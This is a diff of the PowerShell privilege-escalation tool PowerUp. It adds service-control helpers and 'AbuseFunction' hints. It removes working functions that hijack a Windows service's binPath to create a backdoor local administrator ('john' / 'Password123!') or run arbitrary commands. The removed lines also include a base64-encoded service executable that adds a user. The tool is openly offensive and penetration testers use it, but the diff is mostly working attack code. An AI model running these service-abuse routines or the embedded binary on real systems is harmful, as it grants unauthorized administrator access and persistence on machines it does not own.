@@ -1,14 +1,11 @@
 <#
+    PowerUp aims to be a clearinghouse of common Windows privilege escalation
+    vectors that rely on misconfigurations. See README.md for more information.
 
-    PowerUp v1.7
-
-    Various methods to abuse local services to assist
-    with escalation on Windows systems.
-
-    See README.md for more information.
-
-    by: @harmj0y
-
+    Author: @harmj0y
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
 #>
 
 
@@ -26,7 +23,7 @@ function Get-ModifiableFile {
         
     .EXAMPLE
 
-        PS C:\> "C:\Temp\blah.bat" -f "C:\Temp\config.ini" | Get-ModifiableFile
+        PS C:\> '"C:\Temp\blah.bat" -f "C:\Temp\config.ini"' | Get-ModifiableFile
 
         Return the paths "C:\Temp\blah.bat" or "C:\Temp\config.ini" if they are
         modifable by the current user context.
@@ -35,7 +32,7 @@ function Get-ModifiableFile {
     [CmdletBinding()]
     Param(
         [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
-        [string]
+        [String]
         $Path
     )
 
@@ -84,134 +81,220 @@ function Get-ModifiableFile {
     }
 }
 
-function Get-ServiceDaclPermission {
+
+function Invoke-ServiceStart {
 <#
     .SYNOPSIS
 
-        Helper that wraps 'sc.exe sdshow', parses its output, and returns 
-        the DACL permissions of a given service name and user sid.
+        Starts a specified service, first enabling the service if it was marked as disabled.
 
     .PARAMETER ServiceName
 
-        The service name to get its DACL. Required.
+        The service name to start. Required.
 
-    .PARAMETER UserSid
+    .EXAMPLE
 
-        The User SID. If not given, it defaults to the SID of the current user.
+        PS C:\> Invoke-ServiceStart -ServiceName VulnSVC
+
+        Start the 'VulnSVC' service.
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
+        [String]
+        $ServiceName
+    )
+
+    process {
+        # query WMI for the service
+        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
+        
+        # make sure we got a result back
+        if (-not ($TargetService)){
+            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
+            return $False
+        }
+            
+        try {
+            # enable the service if it was marked as disabled
+            if ($TargetService.StartMode -eq "Disabled"){
+                $r = Invoke-ServiceEnable -ServiceName "$($TargetService.Name)"
+                if (-not $r){ 
+                    return $False 
+                }
+            }
+
+            # start the service
+            Write-Verbose "Starting service '$($TargetService.Name)'"
+            $Null = sc.exe start "$($TargetService.Name)"
+
+            Start-Sleep -s 1
+            return $True
+        }
+        catch{
+            Write-Warning "Error: $_"
+            return $False
+        }
+    }
+}
+
+
+function Invoke-ServiceStop {
+<#
+    .SYNOPSIS
+
+        Stops a specified service.
+
+    .PARAMETER ServiceName
+
+        The service name to stop. Required.
         
     .EXAMPLE
 
-        PS C:\> Get-ServiceDaclPermission -ServiceName VulnSVC
+        PS C:\> Invoke-ServiceStop -ServiceName VulnSVC
 
-        Return a string that represents the DACL of 'VulnSVC' for 
-        the current user - For example, "CCLCSWLOCRRC". If the DACL 
-        could not be determined, return $False.
-
-    .EXAMPLE
-
-        PS C:\> Get-ServiceDaclPermission -ServiceName VulnSVC -UserSid S-1-5-21-3148271196-972974428-4261668994-1110
-
-        Return a string that represents the DACL of 'VulnSVC' for 
-        a given user SID - For example, "CCDCLCSWRPWPDTLOCRSDRCWDWO". 
-        If the DACL could not be determined, return $False.
+        Stop the 'VulnSVC' service.
 #>
 
     [CmdletBinding()]
-        Param(
-            [Parameter(Mandatory = $True)]
-            [string]
-            $ServiceName,
+    Param(
+        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
+        [String]
+        $ServiceName
+    )
 
-            [string]
-            $UserSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.value
-        )
+    process {
+        # query WMI for the service
+        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
 
-    # check if sc.exe exists
-    if (-not (Test-Path ("$env:SystemRoot\system32\sc.exe"))){ 
-        Write-Warning "[!] Could not find $env:SystemRoot\system32\sc.exe"
-        return $False
+        # make sure we got a result back
+        if (-not ($TargetService)){
+            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
+            return $False
+        }
+
+        try {
+            # stop the service
+            Write-Verbose "Stopping service '$($TargetService.Name)'"
+            $Result = sc.exe stop "$($TargetService.Name)"
+
+            if ($Result -like "*Access is denied*"){
+                Write-Warning "[!] Access to service $($TargetService.Name) denied"
+                return $False
+            }
+            elseif ($Result -like "*1051*") {
+                # if we can't stop the service because other things depend on it
+                Write-Warning "[!] Stopping service $($TargetService.Name) failed: $Result"
+                return $False
+            }
+
+            Start-Sleep 1
+            return $True
+        }
+        catch{
+            Write-Warning "Error: $_"
+            return $False
+        }
     }
-
-    # retrieve DACL from sc.exe
-    # TODO: find a way to do this without calling sc.exe ...
-    $Output = [string](sc.exe sdshow $ServiceName)
-
-    # check if DACL exists and parse it from sc.exe output
-    if ($Output -match '\(A;;([A-Z]*);;;'+ $UserSid + '\)'){
-        return $Matches[1]
-    }
-    return $False
 }
 
-function Test-ServiceDaclPermission {
+
+function Invoke-ServiceEnable {
 <#
     .SYNOPSIS
 
-        This function checks if a user has specific DACL permissions 
-        for a specific service.
+        Enables a specified service.
 
     .PARAMETER ServiceName
 
-        The service name to verify the permissions against. Required.
-
-    .PARAMETER Dacl
-
-        The DACL permissions. Required.
-
-    .PARAMETER UserSid
-
-        The User SID. If not given, it defaults to the SID of the current user.
-    
+        The service name to enable. Required.
+        
     .EXAMPLE
 
-        PS C:\> Test-ServiceDaclPermission -ServiceName VulnSVC -Dacl WPRPDC
+        PS C:\> Invoke-ServiceEnable -ServiceName VulnSVC
 
-        Return $True if the current user has Stop (WP), Start (RP),
-        and ChangeConf (DC) service permissions for 'VulnSVC' otherwise return $False.
-
-    .EXAMPLE
-
-        PS C:\> Test-ServiceDaclPermission -ServiceName VulnSVC -Dacl WPRPDC -UserSid S-1-5-21-3148271196-972974428-4261668994-1111
-
-        Return $True if the user with a given SID has Stop (WP), Start (RP),
-        and ChangeConf (DC) service permissions for 'VulnSVC' otherwise return $False.
-
-    .LINK
-
-        https://support.microsoft.com/en-us/kb/914392
+        Enables the 'VulnSVC' service.
 #>
 
     [CmdletBinding()]
-        Param(
-            [Parameter(Mandatory = $True)]
-            [string]
-            $ServiceName,
+    Param(
+        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
+        [String]
+        $ServiceName
+    )
 
-            [Parameter(Mandatory = $True)]
-            [string]
-            $Dacl,
+    process {
+        # query WMI for the service
+        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
 
-            [string]
-            $UserSid = [string][System.Security.Principal.WindowsIdentity]::GetCurrent().User.value
-        )
-
-    # get service DACL
-    $DaclString = Get-ServiceDaclPermission -ServiceName $ServiceName $UserSid
-    
-    # check if service permissions were retrieved
-    if (-not ($DaclString)){
-        return $False
-    }
-
-    # check if each of the permissions exists
-    $DaclArray = [array] ($Dacl -split '(.{2})' | Where-Object {$_})
-    ForEach ($DaclPermission in $DaclArray){
-        if (-not ($DaclString -match $DaclPermission.ToUpper())){
-            Return $False
+        # make sure we got a result back
+        if (-not ($TargetService)){
+            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
+            return $False
+        }
+        
+        try {
+            # enable the service
+            Write-Verbose "Enabling service '$TargetService.Name'"
+            $Null = sc.exe config "$($TargetService.Name)" start= demand
+            return $True
+        }
+        catch{
+            Write-Warning "Error: $_"
+            return $False
         }
     }
-    return $True
 }
+
+
+function Invoke-ServiceDisable {
+<#
+    .SYNOPSIS
+
+        Disables a specified service.
+
+    .PARAMETER ServiceName
+
+        The service name to disable. Required.
+    
+    .EXAMPLE
+
+        PS C:\> Invoke-ServiceDisable -ServiceName VulnSVC
+
+        Disables the 'VulnSVC' service.
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
+        [String]
+        $ServiceName
+    )
+    
+    process {
+        # query WMI for the service
+        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
+
+        # make sure we got a result back
+        if (-not ($TargetService)){
+            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
+            return $False
+        }
+        
+        try {
+            # disable the service
+            Write-Verbose "Disabling service '$TargetService.Name'"
+            $Null = sc.exe config "$($TargetService.Name)" start= disabled
+            return $True
+        }
+        catch{
+            Write-Warning "Error: $_"
+            return $False
+        }
+    }
+}
+
 
 ########################################################
 #
@@ -246,6 +329,7 @@ function Get-ServiceUnquoted {
             $Out | Add-Member Noteproperty 'ServiceName' $Service.name
             $Out | Add-Member Noteproperty 'Path' $Service.pathname
             $Out | Add-Member Noteproperty 'StartName' $Service.startname
+            $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -ServiceName '$($Service.name)' -Path <HijackPath>"
             $Out
         }
     }
@@ -280,6 +364,7 @@ function Get-ServiceFilePermission {
             $Out | Add-Member Noteproperty 'Path' $ServicePath
             $Out | Add-Member Noteproperty 'ModifiableFile' $_
             $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
+            $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -ServiceName '$ServiceName'"
             $Out
         }
     }
@@ -301,955 +386,36 @@ function Get-ServicePermission {
         Get a set of potentially exploitable services.
 #>
     
+    # check if sc.exe exists
+    if (-not (Test-Path ("$Env:SystemRoot\System32\sc.exe"))) { 
+        Write-Warning "[!] Could not find $Env:SystemRoot\System32\sc.exe"
+        
+        $Out = New-Object PSObject 
+        $Out | Add-Member Noteproperty 'ServiceName' 'Not Found'
+        $Out | Add-Member Noteproperty 'Path' "$Env:SystemRoot\System32\sc.exe"
+        $Out | Add-Member Noteproperty 'StartName' $Null
+        $Out | Add-Member Noteproperty 'AbuseFunction' $Null
+        $Out
+    }
+
     $Services = Get-WmiObject -Class win32_service | Where-Object {$_}
     
     if ($Services) {
         ForEach ($Service in $Services){
 
-            # check if the current user has the DACL service permission 'DC' (ChangeConf) 
-            $Result = Test-ServiceDaclPermission -ServiceName $Service.name -Dacl 'DC'
+            # try to change error control of a service to its existing value
+            $Result = sc.exe config $($Service.Name) error= $($Service.ErrorControl)
 
-            if ($Result){
+            # means the change was successful
+            if ($Result -contains "[SC] ChangeServiceConfig SUCCESS"){
                 $Out = New-Object PSObject 
                 $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                 $Out | Add-Member Noteproperty 'Path' $Service.pathname
                 $Out | Add-Member Noteproperty 'StartName' $Service.startname
+                $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -ServiceName '$($Service.name)'"
                 $Out
             }
         }
-    }
-}
-
-
-########################################################
-#
-# Service abuse
-#
-########################################################
-
-function Invoke-ServiceUserAdd {
-<#
-    .SYNOPSIS
-
-        This function stops a service, modifies it to create a user, starts
-        the service, stops it, modifies it to add the user to the specified group,
-        stops it, and then restores the original EXE path.
-        
-    .PARAMETER ServiceName
-
-        The service name to manipulate. Required.
-
-    .PARAMETER UserName
-
-        The username to add. If not given, it defaults to "john"
-
-    .PARAMETER Password
-
-        The password to set for the added user. If not given, it defaults to "Password123!"
-
-    .PARAMETER GroupName
-
-        Group to add the user to (default of Administrators)
-
-    .PARAMETER NoCreate
-
-        Don't create the user, just add them to the specific group.
-        
-    .EXAMPLE
-
-        PS C:\> Invoke-ServiceUserAdd -ServiceName VulnSVC
-
-        Abuses service 'VulnSVC' to add a localuser "john" with password 
-        "Password123! to the  machine and local administrator group
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ServiceUserAdd -ServiceName VulnSVC -UserName backdoor -Password password -GroupName "Power Users"
-
-        Abuses service 'VulnSVC' to add a localuser "backdoor" with password 
-        "password" to the  machine and local "Power Users" group
-#>
-
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $ServiceName,
-
-        [string]
-        $UserName = "john",
-
-        [string]
-        $Password = "Password123!",
-
-        [string]
-        $GroupName = "Administrators",
-
-        [Switch]
-        $NoCreate
-    )
-
-    # check if sc.exe exists
-    if (-not (Test-Path ("$env:SystemRoot\System32\sc.exe"))){ 
-        Write-Warning "[!] Could not find $env:SystemRoot\System32\sc.exe"
-        return $False
-    }
-
-    # query WMI for the service
-    $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
-
-    # make sure we got a result back
-    if ($TargetService){
-        try{
-
-            # try to enable the service it was disabled
-            $RestoreDisabled = $False
-            if ($TargetService.StartMode -eq "Disabled"){
-                Write-Verbose "Service '$ServiceName' disabled, enabling..."
-
-                $Result = sc.exe config $($TargetService.Name) start= demand
-                if ($Result -contains "Access is denied."){
-                    Write-Warning "[!] Access to service $($TargetService.Name) denied"
-                    return $False
-                }
-                $RestoreDisabled = $True
-            }
-
-            # extract the original path and state so we can restore it later
-            $OriginalPath = $TargetService.PathName
-            $OriginalState = $TargetService.State
-            Write-Verbose "Service '$ServiceName' original path: '$OriginalPath'"
-            Write-Verbose "Service '$ServiceName' original state: '$OriginalState'"
-
-            # if we're creating the specific user
-            if(-not $NoCreate) {
-                # stop the service
-                if ($Result -like "*Access is denied*"){
-                    Write-Warning "[!] Access to service $($TargetService.Name) denied"
-                    return $False
-                }
-                elseif ($Result -like "*1051*") {
-                    # if we can't stop the service because other things depend on it
-                    Write-Warning "[!] Stopping service $($TargetService.Name) failed: $Result"
-                    return $False
-                }
-
-                Write-Verbose "Adding user '$UserName'"
-                # modify the service path to add a user
-                $UserAddCommand = "net user $UserName $Password /add"
-                # change the path name to the user add command- 
-                #   if sc config doesn't error out here, it shouldn't later on
-                $Result = sc.exe config $($TargetService.Name) binPath= $UserAddCommand
-                if ($Result -contains "Access is denied."){
-                    Write-Warning "[!] Access to service $($TargetService.Name) denied"
-                    return $False
-                }
-
-                # start the service and breath
-                $Result = sc.exe start $($TargetService.Name)
-                Start-Sleep -s 1
-            }
-
-            Write-Verbose "Adding user '$UserName' to group '$GroupName'"
-            # stop the service
-            $Result = sc.exe stop $($TargetService.Name)
-            Start-Sleep -s 1
-
-            if ($Result -like "*Access is denied*"){
-                Write-Warning "[!] Access to service $($TargetService.Name) denied"
-                return $False
-            }
-            elseif ($Result -like "*1051*") {
-                # if we can't stop the service because other things depend on it
-                Write-Warning "[!] Stopping service $($TargetService.Name) failed: $Result"
-                return $False
-            }
-
-            # modify the service path to add the user to the specified local group
-            $GroupAddCommand = "net localgroup $GroupName $UserName /add"
-            # change the path name to the group add command
-            $Result = sc.exe config $($TargetService.Name) binPath= $GroupAddCommand
-
-            # start the service and breath
-            $Result = sc.exe start $($TargetService.Name)
-            Start-Sleep -s 1
-
-            Write-Verbose "Restoring original path to service '$ServiceName'"
-            # stop the service
-            $Result = sc.exe stop $($TargetService.Name)
-            Start-Sleep -s 1
-            # restore the original binary path
-            $Result = sc.exe config $($TargetService.Name) binPath= $OriginalPath
-
-            # try to restore the service to whatever state it was
-            if ($RestoreDisabled){
-                Write-Verbose "Re-disabling service '$ServiceName'"
-                $Result = sc.exe config $($TargetService.Name) start= disabled
-            }
-            elseif ($OriginalState -eq "Paused"){
-                Write-Verbose "Starting and then pausing service '$ServiceName'"
-                $Result = sc.exe start $($TargetService.Name)
-                Start-Sleep -s .5
-                $Result = sc.exe pause $($TargetService.Name)
-            }
-            elseif ($OriginalState -eq "Stopped"){
-                Write-Verbose "Leaving service '$ServiceName' in stopped state"
-            }
-            else{
-                Write-Verbose "Starting service '$ServiceName'"
-                $Result = sc.exe start $($TargetService.Name)
-            }
-
-            if(-not $NoCreate) {
-                "[+] User '$UserName' created with password '$Password' and added to localgroup '$GroupName'"
-            }
-            else{
-                "[+] User '$UserName' added to localgroup '$GroupName'"
-            }
-        }
-        catch{
-            Write-Warning "Error while modifying service '$ServiceName': $_"
-            $False
-        }
-    }
-
-    else{
-        Write-Warning "Target service '$ServiceName' not found on the machine"
-        $False
-    }
-}
-
-
-function Invoke-ServiceCMD {
-<#
-    .SYNOPSIS
-
-        This function stops a service, modifies it to execute a given command, starts
-        the service, stops it, and then restores the original EXE path.
-        
-    .PARAMETER ServiceName
-
-        The service name to manipulate. Required.
-
-    .PARAMETER CMD
-
-        The command to execute. Required.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ServiceUserAdd -ServiceName VulnSVC -Command "net user john Password123! /add"
-
-        Abuses service 'VulnSVC' to add a localuser "john" with password 
-        "Password123! to the machine.
-#>
-
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $ServiceName,
-
-        [Parameter(Mandatory = $True)]
-        [string]
-        $CMD
-    )
-
-    # check if sc.exe exists
-    if (-not (Test-Path ("$env:SystemRoot\System32\sc.exe"))){ 
-        Write-Warning "[!] Could not find $env:SystemRoot\System32\sc.exe"
-        return $False
-    }
-
-    # query WMI for the service
-    $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
-
-    # make sure we got a result back
-    if ($TargetService){
-        try{
-
-            # try to enable the service it was it was disabled
-            $RestoreDisabled = $False
-            if ($TargetService.StartMode -eq "Disabled"){
-                Write-Verbose "Service '$ServiceName' disabled, enabling..."
-
-                $Result = sc.exe config $($TargetService.Name) start= demand
-                if ($Result -contains "Access is denied."){
-                    Write-Warning "[!] Access to service $($TargetService.Name) denied"
-                    return $False
-                }
-                $RestoreDisabled = $True
-            }
-
-            # extract the original path and state so we can restore it later
-            $OriginalPath = $TargetService.PathName
-            $OriginalState = $TargetService.State
-            Write-Verbose "Service '$ServiceName' original path: '$OriginalPath'"
-            Write-Verbose "Service '$ServiceName' original state: '$OriginalState'"
-
-            # stop the service
-            $Result = sc.exe stop $($TargetService.Name)
-            Start-Sleep -s 1
-
-            if ($Result -like "*Access is denied*"){
-                Write-Warning "[!] Access to service $($TargetService.Name) denied"
-                return $False
-            }
-            elseif ($Result -like "*1051*") {
-                # if we can't stop the service because other things depend on it
-                Write-Warning "[!] Stopping service $($TargetService.Name) failed: $Result"
-                return $False
-            }
-
-            # change the path name to the specified command
-            Write-Verbose "Setting service to execute command '$CMD'"
-            $Result = sc.exe config $($TargetService.Name) binPath= $CMD
-
-            # start the service and breath
-            $Result = sc.exe start $($TargetService.Name)
-            Start-Sleep -s 1
-
-            Write-Verbose "Restoring original path to service '$ServiceName'"
-            # stop the service
-            $Result = sc.exe stop $($TargetService.Name)
-            Start-Sleep -s 1
-
-            # restore the original binary path
-            $Result = sc.exe config $($TargetService.Name) binPath= $OriginalPath
-
-            # try to restore the service to whatever state it was
-            if ($RestoreDisabled){
-                Write-Verbose "Re-disabling service '$ServiceName'"
-                $Result = sc.exe config $($TargetService.Name) start= disabled
-            }
-            elseif ($OriginalState -eq "Paused"){
-                Write-Verbose "Starting and then pausing service '$ServiceName'"
-                $Result = sc.exe start $($TargetService.Name)
-                Start-Sleep -s .5
-                $Result = sc.exe pause $($TargetService.Name)
-            }
-            elseif ($OriginalState -eq "Stopped"){
-                Write-Verbose "Leaving service '$ServiceName' in stopped state"
-            }
-            else{
-                Write-Verbose "Starting service '$ServiceName'"
-                $Result = sc.exe start $($TargetService.Name)
-            }
-
-            "Command '$CMD' executed."
-        }
-        catch{
-            Write-Warning "Error while modifying service '$ServiceName': $_"
-            $False
-        }
-    }
-
-    else{
-        Write-Warning "Target service '$ServiceName' not found on the machine"
-        $False
-    }
-}
-
-
-function Write-UserAddServiceBinary {
-<#
-    .SYNOPSIS
-
-        This function takes a precompiled C# service executable and binary
-        patches in the service name, and username/password/groupname to add.
-        It then writes the binary out to the specified location.
-        
-    .PARAMETER ServiceName
-
-        The service name the EXE will be running under. Required.
-
-    .PARAMETER Path
-
-        Path to write the binary out to. Defaults to the local directory.
-
-    .PARAMETER UserName
-
-        The username to add. If not given, it defaults to "john"
-
-    .PARAMETER Password
-
-        The password to set for the added user. If not given, it defaults to "Password123!"
-
-    .PARAMETER GroupName
-
-        Group to add the user to (default of Administrators)
-
-    .EXAMPLE
-
-        PS C:\> Write-UserAddServiceBinary -ServiceName VulnSVC
-
-        Writes the service binary for VulnSVC to the local directory.
-#>
-
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $ServiceName,
-
-        [string]
-        $Path = "service.exe",
-
-        [string]
-        $UserName = "john",
-
-        [string]
-        $Password = "Password123!",
-
-        [string]
-        $GroupName = "Administrators"
-    )
-
-    # the raw unpatched service binary
-    $B64Binary = "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Y2VzcwBTZXJ2aWNlQmFzZQBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AFN5c3RlbS5Db21wb25lbnRNb2RlbABJQ29udGFpbmVyAGNvbXBvbmVudHMARGlzcG9zZQBJbml0aWFsaXplQ29tcG9uZW50AC5jdG9yAE9uU3RhcnQAT25TdG9wAE1haW4AZGlzcG9zaW5nAGFyZ3MAU3lzdGVtLlJlZmxlY3Rpb24AQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5Q3VsdHVyZUF0dHJpYnV0ZQBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAQ29tVmlzaWJsZUF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAEFzc2VtYmx5VmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAFN5c3RlbS5EaWFnbm9zdGljcwBEZWJ1Z2dhYmxlQXR0cmlidXRlAERlYnVnZ2luZ01vZGVzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBJRGlzcG9zYWJsZQBDb250YWluZXIAU3RyaW5nAFRyaW0Ac2V0X1NlcnZpY2VOYW1lAENvbmNhdABQcm9jZXNzAFN0YXJ0AFN5c3RlbS5UaHJlYWRpbmcAVGhyZWFkAFNsZWVwAEVudmlyb25tZW50AEV4aXQAUnVuAAAARUEAQQBBACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAAEVYAFgAWAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAABFWQBZAFkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAARVoAWgBaACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAABkvAEMAIABuAGUAdAAgAHUAcwBlAHIAIAAAAyAAAAsgAC8AYQBkAGQAAA9jAG0AZAAuAGUAeABlAAAlLwBDACAAbgBlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwACAAAAAAAHhx4E7hYAtHnOz3CLPJGykACLA/X38R1Qo6CLd6XFYZNOCJAwYSDQQgAQECAyAAAQUgAQEdDgMAAAEEIAEBDgUgAQERSQQgAQEIAyAADgUAAQ4dDgYAAhJhDg4EAAEBCAsHBw4ODg4OHQ4dDgYAAQEdEgUIBwIdEgUdEgUMAQAHVXBkYXRlcgAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAxNQAAKQEAJDdjYTFiMzJhLTljMzctNDE1Yi1iZDlmLWRkZjQxOTllMTZlYwAADAEABzEuMC4wLjAAAGUBACkuTkVURnJhbWV3b3JrLFZlcnNpb249djQuMCxQcm9maWxlPUNsaWVudAEAVA4URnJhbWV3b3JrRGlzcGxheU5hbWUfLk5FVCBGcmFtZXdvcmsgNCBDbGllbnQgUHJvZmlsZQgBAAIAAAAAAAgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEAAAAAAAAARC8/VQAAAAACAAAAWQAAAFArAABQDQAAUlNEU96HoAZJqgNGhaplF41X24ICAAAAQzpcVXNlcnNcbGFiXERlc2t0b3BcVXBkYXRlclxVcGRhdGVyXG9ialx4ODZcUmVsZWFzZVxVcGRhdGVyLnBkYgAAAADUKwAAAAAAAAAAAADuKwAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4CsAAAAAAAAAAAAAAABfQ29yRXhlTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA